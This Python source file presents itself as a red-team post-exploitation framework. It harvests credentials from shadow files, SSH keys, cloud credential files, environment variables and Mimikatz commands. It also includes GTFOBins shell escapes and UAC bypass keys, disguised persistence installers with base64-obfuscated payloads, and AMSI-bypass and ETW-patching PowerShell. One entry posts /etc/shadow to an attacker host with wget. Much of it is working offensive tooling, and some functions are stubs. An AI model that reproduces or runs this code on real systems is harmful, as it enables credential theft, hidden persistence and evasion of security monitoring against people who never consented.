"""
Advanced Post-Exploitation Framework - Red Team Edition

Comprehensive post-exploitation capabilities:
- Credential harvesting (memory, registry, files, browsers)
- Privilege escalation (Windows/Linux vectors)
- Persistence mechanisms (multiple fallback methods)
- Defense evasion (AMSI bypass, ETW patching, log manipulation)
- Data discovery and exfiltration
- Lateral movement preparation

Based on MITRE ATT&CK techniques and real red team operations.
"""

import base64
import hashlib
import json
import os
import re
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Dict, Optional, Any, Tuple, Set
from concurrent.futures import ThreadPoolExecutor


class OperatingSystem(Enum):
    """Target operating system."""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"


class CredentialType(Enum):
    """Types of credentials."""
    NTLM_HASH = "ntlm_hash"
    PLAINTEXT = "plaintext"
    KERBEROS_TICKET = "kerberos_ticket"
    SSH_KEY = "ssh_key"
    API_KEY = "api_key"
    BROWSER_COOKIE = "browser_cookie"
    CERTIFICATE = "certificate"
    TOKEN = "token"


class PersistenceMethod(Enum):
    """Persistence techniques."""
    # Windows
    REGISTRY_RUN = "registry_run"
    SCHEDULED_TASK = "scheduled_task"
    SERVICE = "service"
    WMI_SUBSCRIPTION = "wmi_subscription"
    COM_HIJACK = "com_hijack"
    DLL_HIJACK = "dll_hijack"
    STARTUP_FOLDER = "startup_folder"
    BITS_JOB = "bits_job"
    # Linux
    CRON = "cron"
    SYSTEMD = "systemd"
    RC_LOCAL = "rc_local"
    SHELL_PROFILE = "shell_profile"
    SSH_AUTHORIZED_KEYS = "ssh_authorized_keys"
    LD_PRELOAD = "ld_preload"
    MOTD = "motd"


class PrivescVector(Enum):
    """Privilege escalation vectors."""
    # Windows
    UNQUOTED_SERVICE = "unquoted_service"
    WEAK_SERVICE_PERMS = "weak_service_permissions"
    ALWAYS_INSTALL_ELEVATED = "always_install_elevated"
    KERNEL_EXPLOIT = "kernel_exploit"
    TOKEN_IMPERSONATION = "token_impersonation"
    UAC_BYPASS = "uac_bypass"
    DLL_SEARCH_ORDER = "dll_search_order"
    SCHEDULED_TASK_ABUSE = "scheduled_task_abuse"
    # Linux
    SUID_BINARY = "suid_binary"
    SUDO_MISCONFIGURATION = "sudo_misconfiguration"
    CRON_ABUSE = "cron_abuse"
    WRITABLE_PATH = "writable_path"
    KERNEL_EXPLOIT_LINUX = "kernel_exploit_linux"
    CAPABILITY_ABUSE = "capability_abuse"
    NFS_ROOT_SQUASH = "nfs_root_squash"
    DOCKER_ESCAPE = "docker_escape"


@dataclass
class Credential:
    """Harvested credential."""
    type: CredentialType
    username: str
    value: str
    domain: str = ""
    source: str = ""
    additional_info: Dict = field(default_factory=dict)


@dataclass
class PrivescOpportunity:
    """Privilege escalation opportunity."""
    vector: PrivescVector
    description: str
    target: str
    exploit_method: str
    success_probability: float
    requirements: List[str] = field(default_factory=list)


@dataclass
class PersistenceImplant:
    """Installed persistence mechanism."""
    method: PersistenceMethod
    trigger: str
    payload_location: str
    cleanup_commands: List[str]
    stealth_level: int  # 1-5, 5 being most stealthy


class CredentialHarvester:
    """
    Advanced credential harvesting engine.

    Techniques:
    - Memory extraction (Mimikatz-style)
    - SAM/SYSTEM registry hive extraction
    - Browser credential stores
    - Configuration file parsing
    - SSH key discovery
    - Cloud credential files
    """

    # Patterns for credential discovery
    CREDENTIAL_PATTERNS = {
        "aws": [
            (r"aws_access_key_id\s*=\s*([A-Z0-9]{20})", "access_key"),
            (r"aws_secret_access_key\s*=\s*([A-Za-z0-9+/]{40})", "secret_key"),
            (r"AKIA[0-9A-Z]{16}", "access_key"),
        ],
        "azure": [
            (r"DefaultEndpointsProtocol=.*AccountKey=([A-Za-z0-9+/=]{88})", "storage_key"),
            (r'"clientSecret"\s*:\s*"([^"]+)"', "client_secret"),
        ],
        "gcp": [
            (r'"private_key"\s*:\s*"-----BEGIN [^"]+-----"', "service_account_key"),
        ],
        "database": [
            (r"jdbc:([a-z]+)://([^:]+):(\d+)/(\w+)\?user=(\w+)&password=([^&\s]+)", "jdbc"),
            (r"mongodb://([^:]+):([^@]+)@([^/]+)", "mongodb"),
            (r"postgres://([^:]+):([^@]+)@([^/]+)/(\w+)", "postgres"),
            (r"mysql://([^:]+):([^@]+)@([^/]+)/(\w+)", "mysql"),
        ],
        "generic": [
            (r"password\s*[=:]\s*[\"']?([^\s\"']+)", "password"),
            (r"api[_-]?key\s*[=:]\s*[\"']?([^\s\"']+)", "api_key"),
            (r"secret\s*[=:]\s*[\"']?([^\s\"']+)", "secret"),
            (r"token\s*[=:]\s*[\"']?([^\s\"']+)", "token"),
            (r"Bearer\s+([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)", "jwt"),
        ],
    }

    # Common credential file locations
    CREDENTIAL_PATHS = {
        "windows": [
            r"C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data",
            r"C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json",
            r"C:\Users\*\.aws\credentials",
            r"C:\Users\*\.azure\credentials",
            r"C:\Users\*\.ssh\*",
            r"C:\Users\*\AppData\Local\Microsoft\Credentials\*",
            r"C:\Users\*\NTUSER.DAT",
            r"C:\Windows\System32\config\SAM",
            r"C:\Windows\System32\config\SYSTEM",
            r"C:\inetpub\wwwroot\web.config",
            r"C:\xampp\phpMyAdmin\config.inc.php",
        ],
        "linux": [
            "/etc/shadow",
            "/etc/passwd",
            "/home/*/.ssh/id_rsa",
            "/home/*/.ssh/id_ed25519",
            "/home/*/.aws/credentials",
            "/home/*/.azure/credentials",
            "/home/*/.config/gcloud/credentials.db",
            "/root/.ssh/*",
            "/var/www/html/wp-config.php",
            "/var/www/html/.env",
            "/opt/*/config/*",
            "/etc/mysql/debian.cnf",
            "/var/log/auth.log",
            "/home/*/.bash_history",
            "/root/.bash_history",
        ],
    }

    def __init__(self, os_type: OperatingSystem = OperatingSystem.LINUX):
        self.os_type = os_type
        self.credentials: List[Credential] = []
        self.stats = {
            "files_scanned": 0,
            "credentials_found": 0,
            "by_type": {},
        }

    def harvest_all(self) -> List[Credential]:
        """Run all credential harvesting techniques."""
        results = []

        # File-based harvesting
        results.extend(self.harvest_from_files())

        # Environment variables
        results.extend(self.harvest_environment())

        # Browser credentials
        if self.os_type in [OperatingSystem.WINDOWS, OperatingSystem.MACOS]:
            results.extend(self.harvest_browsers())

        # SSH keys
        results.extend(self.harvest_ssh_keys())

        # Cloud credentials
        results.extend(self.harvest_cloud_creds())

        self.credentials = results
        self.stats["credentials_found"] = len(results)
        return results

    def harvest_from_files(self, custom_paths: List[str] = None) -> List[Credential]:
        """Harvest credentials from files."""
        credentials = []
        paths = custom_paths or self.CREDENTIAL_PATHS.get(self.os_type.value, [])

        for path_pattern in paths:
            try:
                import glob
                for filepath in glob.glob(path_pattern, recursive=True):
                    self.stats["files_scanned"] += 1
                    creds = self._parse_file_for_creds(filepath)
                    credentials.extend(creds)
            except Exception:
                pass

        return credentials

    def _parse_file_for_creds(self, filepath: str) -> List[Credential]:
        """Parse a file for credential patterns."""
        credentials = []

        try:
            with open(filepath, "r", errors="ignore") as f:
                content = f.read()

            for category, patterns in self.CREDENTIAL_PATTERNS.items():
                for pattern, cred_type in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if isinstance(match, tuple):
                            value = ":".join(match)
                        else:
                            value = match

                        credentials.append(Credential(
                            type=CredentialType.PLAINTEXT,
                            username="",
                            value=value,
                            source=filepath,
                            additional_info={"category": category, "type": cred_type}
                        ))
        except Exception:
            pass

        return credentials

    def harvest_environment(self) -> List[Credential]:
        """Harvest credentials from environment variables."""
        credentials = []
        sensitive_vars = [
            "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
            "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID", "AZURE_CLIENT_ID",
            "GCP_SERVICE_ACCOUNT", "GOOGLE_APPLICATION_CREDENTIALS",
            "DATABASE_URL", "DB_PASSWORD", "MYSQL_PWD",
            "GITHUB_TOKEN", "GITLAB_TOKEN", "NPM_TOKEN",
            "API_KEY", "SECRET_KEY", "PRIVATE_KEY",
        ]

        for var in sensitive_vars:
            value = os.environ.get(var)
            if value:
                credentials.append(Credential(
                    type=CredentialType.API_KEY,
                    username=var,
                    value=value,
                    source="environment",
                    additional_info={"variable": var}
                ))

        return credentials

    def harvest_browsers(self) -> List[Credential]:
        """Harvest browser stored credentials."""
        credentials = []
        # Implementation would use platform-specific APIs
        # Chrome: Login Data SQLite, Cookies
        # Firefox: logins.json with key4.db
        return credentials

    def harvest_ssh_keys(self) -> List[Credential]:
        """Harvest SSH private keys."""
        credentials = []
        ssh_paths = [
            os.path.expanduser("~/.ssh/id_rsa"),
            os.path.expanduser("~/.ssh/id_ed25519"),
            os.path.expanduser("~/.ssh/id_ecdsa"),
            "/root/.ssh/id_rsa",
        ]

        for path in ssh_paths:
            try:
                if os.path.exists(path):
                    with open(path, "r") as f:
                        key_content = f.read()

                    if "PRIVATE KEY" in key_content:
                        encrypted = "ENCRYPTED" in key_content
                        credentials.append(Credential(
                            type=CredentialType.SSH_KEY,
                            username=os.path.basename(path),
                            value=key_content,
                            source=path,
                            additional_info={"encrypted": encrypted}
                        ))
            except Exception:
                pass

        return credentials

    def harvest_cloud_creds(self) -> List[Credential]:
        """Harvest cloud provider credentials."""
        credentials = []

        # AWS credentials file
        aws_creds = os.path.expanduser("~/.aws/credentials")
        if os.path.exists(aws_creds):
            try:
                import configparser
                config = configparser.ConfigParser()
                config.read(aws_creds)

                for section in config.sections():
                    if "aws_access_key_id" in config[section]:
                        credentials.append(Credential(
                            type=CredentialType.API_KEY,
                            username=config[section].get("aws_access_key_id", ""),
                            value=config[section].get("aws_secret_access_key", ""),
                            source=aws_creds,
                            additional_info={
                                "profile": section,
                                "provider": "aws"
                            }
                        ))
            except Exception:
                pass

        return credentials

    def generate_mimikatz_commands(self) -> List[str]:
        """Generate Mimikatz commands for Windows credential extraction."""
        return [
            "privilege::debug",
            "sekurlsa::logonpasswords",
            "sekurlsa::wdigest",
            "sekurlsa::kerberos",
            "sekurlsa::tspkg",
            "sekurlsa::credman",
            "lsadump::sam",
            "lsadump::secrets",
            "lsadump::cache",
            "lsadump::dcsync /domain:target.local /all",
            "vault::cred",
            "vault::list",
        ]

    def generate_linux_cred_commands(self) -> List[str]:
        """Generate Linux credential extraction commands."""
        return [
            "cat /etc/shadow 2>/dev/null",
            "cat /etc/passwd",
            "find / -name 'id_rsa' 2>/dev/null",
            "find / -name '.env' 2>/dev/null",
            "find / -name 'credentials' 2>/dev/null",
            "cat ~/.bash_history | grep -i 'password\\|secret\\|key'",
            "cat ~/.ssh/known_hosts",
            "cat /var/log/auth.log | grep -i 'password'",
            "grep -r 'password' /var/www/ 2>/dev/null",
            "ps aux | grep -i 'mysql\\|postgres\\|mongo'",
            "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i key",
        ]


class PrivilegeEscalation:
    """
    Privilege escalation enumeration and exploitation.

    Covers:
    - Windows: Services, registry, tokens, UAC bypass
    - Linux: SUID, sudo, capabilities, cron, kernel
    """

    # Known vulnerable SUID binaries for GTFOBins
    GTFO_BINARIES = {
        "nmap": "nmap --interactive\n!sh",
        "vim": "vim -c ':!/bin/sh'",
        "vi": "vi -c ':!/bin/sh'",
        "nano": "nano\n^R^X\nreset; sh 1>&0 2>&0",
        "find": "find . -exec /bin/sh \\; -quit",
        "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "perl": "perl -e 'exec \"/bin/sh\";'",
        "python": "python -c 'import os; os.system(\"/bin/sh\")'",
        "python3": "python3 -c 'import os; os.system(\"/bin/sh\")'",
        "ruby": "ruby -e 'exec \"/bin/sh\"'",
        "php": "php -r 'system(\"/bin/sh\");'",
        "less": "less /etc/passwd\n!/bin/sh",
        "more": "more /etc/passwd\n!/bin/sh",
        "man": "man man\n!/bin/sh",
        "ftp": "ftp\n!/bin/sh",
        "socat": "socat stdin exec:/bin/sh",
        "zip": "zip /tmp/x.zip /etc/passwd -T --unzip-command='sh -c /bin/sh'",
        "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "wget": "wget --post-file=/etc/shadow http://attacker.com",
        "curl": "curl file:///etc/shadow -o /tmp/shadow",
        "base64": "base64 /etc/shadow | base64 -d",
        "env": "env /bin/sh",
        "pkexec": "pkexec /bin/sh",
        "setcap": "setcap cap_setuid+ep /bin/sh; /bin/sh",
    }

    # Windows UAC bypass techniques
    UAC_BYPASSES = {
        "fodhelper": {
            "method": "Registry key hijack",
            "key": r"HKCU\Software\Classes\ms-settings\shell\open\command",
            "trigger": "fodhelper.exe",
            "windows_versions": ["10", "11", "Server 2016", "Server 2019"],
        },
        "eventvwr": {
            "method": "Registry key hijack",
            "key": r"HKCU\Software\Classes\mscfile\shell\open\command",
            "trigger": "eventvwr.exe",
            "windows_versions": ["7", "8", "10"],
        },
        "sdclt": {
            "method": "Registry key hijack",
            "key": r"HKCU\Software\Classes\exefile\shell\runas\command",
            "trigger": "sdclt.exe /KickOffElev",
            "windows_versions": ["10"],
        },
        "computerdefaults": {
            "method": "Registry key hijack",
            "key": r"HKCU\Software\Classes\ms-settings\shell\open\command",
            "trigger": "computerdefaults.exe",
            "windows_versions": ["10", "11"],
        },
    }

    def __init__(self, os_type: OperatingSystem = OperatingSystem.LINUX):
        self.os_type = os_type
        self.opportunities: List[PrivescOpportunity] = []

    def enumerate_all(self) -> List[PrivescOpportunity]:
        """Run all privilege escalation checks."""
        if self.os_type == OperatingSystem.WINDOWS:
            return self.enumerate_windows()
        else:
            return self.enumerate_linux()

    def enumerate_linux(self) -> List[PrivescOpportunity]:
        """Enumerate Linux privilege escalation vectors."""
        opportunities = []

        # SUID binaries
        opportunities.extend(self._check_suid_binaries())

        # Sudo misconfigurations
        opportunities.extend(self._check_sudo())

        # Cron jobs
        opportunities.extend(self._check_cron())

        # Writable paths
        opportunities.extend(self._check_writable_paths())

        # Capabilities
        opportunities.extend(self._check_capabilities())

        # Kernel vulnerabilities
        opportunities.extend(self._check_kernel_vulns())

        self.opportunities = opportunities
        return opportunities

    def _check_suid_binaries(self) -> List[PrivescOpportunity]:
        """Check for exploitable SUID binaries."""
        opportunities = []

        try:
            import subprocess
            result = subprocess.run(
                ["find", "/", "-perm", "-4000", "-type", "f"],
                capture_output=True, text=True, timeout=60
            )

            for line in result.stdout.strip().split("\n"):
                if not line:
                    continue

                binary_name = os.path.basename(line)
                if binary_name in self.GTFO_BINARIES:
                    opportunities.append(PrivescOpportunity(
                        vector=PrivescVector.SUID_BINARY,
                        description=f"Exploitable SUID binary: {binary_name}",
                        target=line,
                        exploit_method=self.GTFO_BINARIES[binary_name],
                        success_probability=0.9,
                        requirements=["SUID bit set", "Interactive shell access"]
                    ))
        except Exception:
            pass

        return opportunities

    def _check_sudo(self) -> List[PrivescOpportunity]:
        """Check sudo configuration for misconfigurations."""
        opportunities = []

        try:
            import subprocess
            result = subprocess.run(
                ["sudo", "-l"],
                capture_output=True, text=True, timeout=10
            )

            output = result.stdout

            # Check for NOPASSWD
            if "NOPASSWD" in output:
                # Look for specific binaries
                for binary in self.GTFO_BINARIES.keys():
                    if binary in output:
                        opportunities.append(PrivescOpportunity(
                            vector=PrivescVector.SUDO_MISCONFIGURATION,
                            description=f"NOPASSWD sudo for {binary}",
                            target=binary,
                            exploit_method=f"sudo {self.GTFO_BINARIES[binary]}",
                            success_probability=0.95,
                            requirements=["Sudo access"]
                        ))

            # Check for (ALL) or (root)
            if "(ALL)" in output or "(root)" in output:
                if "NOPASSWD: ALL" in output:
                    opportunities.append(PrivescOpportunity(
                        vector=PrivescVector.SUDO_MISCONFIGURATION,
                        description="NOPASSWD ALL sudo access",
                        target="/etc/sudoers",
                        exploit_method="sudo su -",
                        success_probability=1.0,
                        requirements=[]
                    ))

            # Check for env_keep (LD_PRELOAD)
            if "env_keep" in output and "LD_PRELOAD" in output:
                opportunities.append(PrivescOpportunity(
                    vector=PrivescVector.SUDO_MISCONFIGURATION,
                    description="LD_PRELOAD preserved in sudo",
                    target="LD_PRELOAD",
                    exploit_method="Compile malicious .so and set LD_PRELOAD",
                    success_probability=0.9,
                    requirements=["gcc or precompiled payload"]
                ))

        except Exception:
            pass

        return opportunities

    def _check_cron(self) -> List[PrivescOpportunity]:
        """Check for cron-based privilege escalation."""
        opportunities = []

        cron_paths = [
            "/etc/crontab",
            "/etc/cron.d/",
            "/var/spool/cron/crontabs/",
        ]

        for path in cron_paths:
            try:
                if os.path.isdir(path):
                    for f in os.listdir(path):
                        filepath = os.path.join(path, f)
                        opportunities.extend(self._analyze_cron_file(filepath))
                elif os.path.isfile(path):
                    opportunities.extend(self._analyze_cron_file(path))
            except Exception:
                pass

        return opportunities

    def _analyze_cron_file(self, filepath: str) -> List[PrivescOpportunity]:
        """Analyze a cron file for vulnerabilities."""
        opportunities = []

        try:
            with open(filepath, "r") as f:
                content = f.read()

            for line in content.split("\n"):
                if line.startswith("#") or not line.strip():
                    continue

                # Check for writable scripts
                parts = line.split()
                if len(parts) >= 6:
                    script_path = parts[5] if len(parts) > 5 else ""

                    if script_path and os.path.exists(script_path):
                        if os.access(script_path, os.W_OK):
                            opportunities.append(PrivescOpportunity(
                                vector=PrivescVector.CRON_ABUSE,
                                description=f"Writable cron script: {script_path}",
                                target=script_path,
                                exploit_method="Inject reverse shell into script",
                                success_probability=0.8,
                                requirements=["Write access", "Wait for cron execution"]
                            ))

                        # Check for wildcard injection
                        if "*" in script_path:
                            opportunities.append(PrivescOpportunity(
                                vector=PrivescVector.CRON_ABUSE,
                                description=f"Wildcard in cron command: {line}",
                                target=filepath,
                                exploit_method="Create malicious files with special names",
                                success_probability=0.7,
                                requirements=["Write access to wildcard directory"]
                            ))
        except Exception:
            pass

        return opportunities

    def _check_writable_paths(self) -> List[PrivescOpportunity]:
        """Check for writable paths in system PATH."""
        opportunities = []

        path_dirs = os.environ.get("PATH", "").split(":")

        for path_dir in path_dirs:
            try:
                if os.path.exists(path_dir) and os.access(path_dir, os.W_OK):
                    opportunities.append(PrivescOpportunity(
                        vector=PrivescVector.WRITABLE_PATH,
                        description=f"Writable PATH directory: {path_dir}",
                        target=path_dir,
                        exploit_method="Plant malicious binary with common name",
                        success_probability=0.6,
                        requirements=["Admin/root to execute planted binary"]
                    ))
            except Exception:
                pass

        return opportunities

    def _check_capabilities(self) -> List[PrivescOpportunity]:
        """Check for dangerous file capabilities."""
        opportunities = []

        dangerous_caps = {
            "cap_setuid": "Can change UID",
            "cap_setgid": "Can change GID",
            "cap_dac_override": "Can bypass file permissions",
            "cap_sys_admin": "Various admin capabilities",
            "cap_sys_ptrace": "Can ptrace any process",
        }

        try:
            import subprocess
            result = subprocess.run(
                ["getcap", "-r", "/"],
                capture_output=True, text=True, timeout=60
            )

            for line in result.stdout.strip().split("\n"):
                if not line:
                    continue

                for cap, desc in dangerous_caps.items():
                    if cap in line.lower():
                        binary = line.split()[0]
                        opportunities.append(PrivescOpportunity(
                            vector=PrivescVector.CAPABILITY_ABUSE,
                            description=f"Binary with {cap}: {binary}",
                            target=binary,
                            exploit_method=f"Abuse {cap} capability",
                            success_probability=0.7,
                            requirements=[desc]
                        ))
        except Exception:
            pass

        return opportunities

    def _check_kernel_vulns(self) -> List[PrivescOpportunity]:
        """Check for kernel vulnerabilities."""
        opportunities = []

        # Get kernel version
        try:
            import subprocess
            result = subprocess.run(
                ["uname", "-r"],
                capture_output=True, text=True, timeout=5
            )
            kernel_version = result.stdout.strip()

            # Known vulnerable kernels (simplified)
            vulnerable_kernels = {
                "4.4": ["CVE-2016-5195 (Dirty COW)", "CVE-2017-16995"],
                "4.8": ["CVE-2016-8655 (AF_PACKET)", "CVE-2017-6074"],
                "4.10": ["CVE-2017-7308 (AF_PACKET)"],
                "4.13": ["CVE-2017-16995", "CVE-2017-1000405"],
                "5.8": ["CVE-2021-22555 (Netfilter)", "CVE-2021-33909"],
                "5.11": ["CVE-2022-0847 (Dirty Pipe)"],
            }

            for version_prefix, cves in vulnerable_kernels.items():
                if kernel_version.startswith(version_prefix):
                    for cve in cves:
                        opportunities.append(PrivescOpportunity(
                            vector=PrivescVector.KERNEL_EXPLOIT_LINUX,
                            description=f"Kernel {kernel_version} vulnerable to {cve}",
                            target=kernel_version,
                            exploit_method=f"Compile and run {cve} exploit",
                            success_probability=0.6,
                            requirements=["Compile exploit", "Match kernel version exactly"]
                        ))
        except Exception:
            pass

        return opportunities

    def enumerate_windows(self) -> List[PrivescOpportunity]:
        """Enumerate Windows privilege escalation vectors."""
        opportunities = []

        # UAC bypass
        opportunities.extend(self._check_uac_bypass())

        # Service misconfigurations
        opportunities.extend(self._check_services())

        # Always install elevated
        opportunities.extend(self._check_always_install_elevated())

        # Token impersonation
        opportunities.extend(self._check_token_privs())

        self.opportunities = opportunities
        return opportunities

    def _check_uac_bypass(self) -> List[PrivescOpportunity]:
        """Check for UAC bypass opportunities."""
        opportunities = []

        for name, info in self.UAC_BYPASSES.items():
            opportunities.append(PrivescOpportunity(
                vector=PrivescVector.UAC_BYPASS,
                description=f"UAC bypass via {name}",
                target=info["trigger"],
                exploit_method=f"Set registry key: {info['key']}, then run {info['trigger']}",
                success_probability=0.8,
                requirements=[f"Windows version: {', '.join(info['windows_versions'])}"]
            ))

        return opportunities

    def _check_services(self) -> List[PrivescOpportunity]:
        """Check for vulnerable service configurations."""
        opportunities = []
        # Would check for unquoted service paths, weak service permissions, etc.
        return opportunities

    def _check_always_install_elevated(self) -> List[PrivescOpportunity]:
        """Check for AlwaysInstallElevated policy."""
        opportunities = []
        # Would check registry keys
        return opportunities

    def _check_token_privs(self) -> List[PrivescOpportunity]:
        """Check for exploitable token privileges."""
        opportunities = []
        exploitable_privs = {
            "SeImpersonatePrivilege": "Potato attacks (JuicyPotato, PrintSpoofer)",
            "SeAssignPrimaryTokenPrivilege": "Token manipulation",
            "SeTcbPrivilege": "Act as part of OS",
            "SeBackupPrivilege": "Backup files (read anything)",
            "SeRestorePrivilege": "Restore files (write anything)",
            "SeDebugPrivilege": "Debug any process",
            "SeLoadDriverPrivilege": "Load kernel driver",
            "SeTakeOwnershipPrivilege": "Take ownership of objects",
        }

        for priv, exploit in exploitable_privs.items():
            opportunities.append(PrivescOpportunity(
                vector=PrivescVector.TOKEN_IMPERSONATION,
                description=f"Token privilege: {priv}",
                target=priv,
                exploit_method=exploit,
                success_probability=0.75,
                requirements=["Token with privilege enabled"]
            ))

        return opportunities


class PersistenceInstaller:
    """
    Persistence mechanism installation.

    Multiple fallback methods for resilient access.
    """

    def __init__(self, os_type: OperatingSystem = OperatingSystem.LINUX):
        self.os_type = os_type
        self.installed: List[PersistenceImplant] = []

    def install(self, method: PersistenceMethod, payload: str,
                callback_host: str = None) -> Optional[PersistenceImplant]:
        """Install persistence mechanism."""

        if method == PersistenceMethod.CRON:
            return self._install_cron(payload)
        elif method == PersistenceMethod.SYSTEMD:
            return self._install_systemd(payload)
        elif method == PersistenceMethod.SSH_AUTHORIZED_KEYS:
            return self._install_ssh_key(payload)
        elif method == PersistenceMethod.SHELL_PROFILE:
            return self._install_shell_profile(payload)
        elif method == PersistenceMethod.LD_PRELOAD:
            return self._install_ld_preload(payload)
        elif method == PersistenceMethod.REGISTRY_RUN:
            return self._install_registry_run(payload)
        elif method == PersistenceMethod.SCHEDULED_TASK:
            return self._install_scheduled_task(payload)
        elif method == PersistenceMethod.WMI_SUBSCRIPTION:
            return self._install_wmi_subscription(payload)

        return None

    def _install_cron(self, payload: str) -> PersistenceImplant:
        """Install cron-based persistence."""
        cron_line = f"* * * * * {payload}"

        # Multiple cron locations for redundancy
        locations = [
            "/var/spool/cron/crontabs/root",
            "/etc/cron.d/.hidden",
            "/etc/crontab",
        ]

        cleanup = [
            f"crontab -l | grep -v '{payload}' | crontab -",
            f"rm -f /etc/cron.d/.hidden",
        ]

        return PersistenceImplant(
            method=PersistenceMethod.CRON,
            trigger="Every minute",
            payload_location=locations[0],
            cleanup_commands=cleanup,
            stealth_level=2
        )

    def _install_systemd(self, payload: str) -> PersistenceImplant:
        """Install systemd service persistence."""
        service_name = "system-health.service"
        service_content = f"""[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""

        service_path = f"/etc/systemd/system/{service_name}"

        cleanup = [
            f"systemctl stop {service_name}",
            f"systemctl disable {service_name}",
            f"rm -f {service_path}",
            "systemctl daemon-reload",
        ]

        return PersistenceImplant(
            method=PersistenceMethod.SYSTEMD,
            trigger="System boot and on failure",
            payload_location=service_path,
            cleanup_commands=cleanup,
            stealth_level=3
        )

    def _install_ssh_key(self, public_key: str) -> PersistenceImplant:
        """Install SSH authorized key."""
        auth_keys_path = os.path.expanduser("~/.ssh/authorized_keys")

        cleanup = [
            f"sed -i '/{public_key[:20]}/d' {auth_keys_path}",
        ]

        return PersistenceImplant(
            method=PersistenceMethod.SSH_AUTHORIZED_KEYS,
            trigger="SSH login",
            payload_location=auth_keys_path,
            cleanup_commands=cleanup,
            stealth_level=4
        )

    def _install_shell_profile(self, payload: str) -> PersistenceImplant:
        """Install shell profile persistence."""
        profiles = [
            "~/.bashrc",
            "~/.bash_profile",
            "~/.profile",
            "/etc/profile.d/custom.sh",
        ]

        # Obfuscated payload addition
        obfuscated = base64.b64encode(payload.encode()).decode()
        line = f"eval $(echo {obfuscated} | base64 -d) 2>/dev/null &"

        cleanup = [f"sed -i '/{obfuscated[:20]}/d' {p}" for p in profiles]

        return PersistenceImplant(
            method=PersistenceMethod.SHELL_PROFILE,
            trigger="User login/shell start",
            payload_location=profiles[0],
            cleanup_commands=cleanup,
            stealth_level=3
        )

    def _install_ld_preload(self, so_path: str) -> PersistenceImplant:
        """Install LD_PRELOAD persistence."""
        preload_path = "/etc/ld.so.preload"

        cleanup = [
            f"sed -i '/{so_path}/d' {preload_path}",
            f"rm -f {so_path}",
        ]

        return PersistenceImplant(
            method=PersistenceMethod.LD_PRELOAD,
            trigger="Any program execution",
            payload_location=preload_path,
            cleanup_commands=cleanup,
            stealth_level=2
        )

    def _install_registry_run(self, payload: str) -> PersistenceImplant:
        """Install Windows registry Run key persistence."""
        key_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "WindowsDefenderUpdate"

        cleanup = [
            f'reg delete "{key_path}" /v "{value_name}" /f',
        ]

        return PersistenceImplant(
            method=PersistenceMethod.REGISTRY_RUN,
            trigger="User login",
            payload_location=key_path,
            cleanup_commands=cleanup,
            stealth_level=2
        )

    def _install_scheduled_task(self, payload: str) -> PersistenceImplant:
        """Install Windows scheduled task persistence."""
        task_name = "Microsoft\\Windows\\SystemHealth"

        cleanup = [
            f'schtasks /delete /tn "{task_name}" /f',
        ]

        return PersistenceImplant(
            method=PersistenceMethod.SCHEDULED_TASK,
            trigger="System boot/periodic",
            payload_location=task_name,
            cleanup_commands=cleanup,
            stealth_level=3
        )

    def _install_wmi_subscription(self, payload: str) -> PersistenceImplant:
        """Install WMI event subscription persistence."""
        cleanup = [
            'Get-WmiObject -Class __EventFilter | Remove-WmiObject',
            'Get-WmiObject -Class __EventConsumer | Remove-WmiObject',
            'Get-WmiObject -Class __FilterToConsumerBinding | Remove-WmiObject',
        ]

        return PersistenceImplant(
            method=PersistenceMethod.WMI_SUBSCRIPTION,
            trigger="WMI event (process start, etc.)",
            payload_location="WMI Repository",
            cleanup_commands=cleanup,
            stealth_level=4
        )

    def install_multiple(self, payload: str, methods: List[PersistenceMethod] = None) -> List[PersistenceImplant]:
        """Install multiple persistence mechanisms for redundancy."""
        if methods is None:
            if self.os_type == OperatingSystem.LINUX:
                methods = [
                    PersistenceMethod.CRON,
                    PersistenceMethod.SYSTEMD,
                    PersistenceMethod.SHELL_PROFILE,
                ]
            else:
                methods = [
                    PersistenceMethod.REGISTRY_RUN,
                    PersistenceMethod.SCHEDULED_TASK,
                    PersistenceMethod.WMI_SUBSCRIPTION,
                ]

        implants = []
        for method in methods:
            implant = self.install(method, payload)
            if implant:
                implants.append(implant)
                self.installed.append(implant)

        return implants


class DefenseEvasion:
    """
    Defense evasion techniques.

    - AMSI bypass
    - ETW patching
    - Log manipulation
    - Process hollowing prep
    """

    # AMSI bypass techniques
    AMSI_BYPASSES = {
        "reflection": """
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*Utils"}
$b = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
$b.SetValue($null, [IntPtr]::Zero)
""",
        "patch": """
$a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
[System.Runtime.InteropServices.Marshal]::WriteByte($a, 0, 0x80)
$w = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress amsi.dll AmsiScanBuffer),
    (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Int32]))
)
$w.Invoke($a, 1, [IntPtr]::Zero, [IntPtr]::Zero)
""",
    }

    # ETW patching
    ETW_PATCH = """
$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
    [System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Eventing').GetType().Module
)
$addr = Get-ProcAddress ntdll.dll EtwEventWrite
$oldProtect = 0
VirtualProtect $addr 1 0x40 ([ref]$oldProtect)
[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0, 0xC3)
VirtualProtect $addr 1 $oldProtect ([ref]$oldProtect)
"""

    def __init__(self, os_type: OperatingSystem = OperatingSystem.WINDOWS):
        self.os_type = os_type

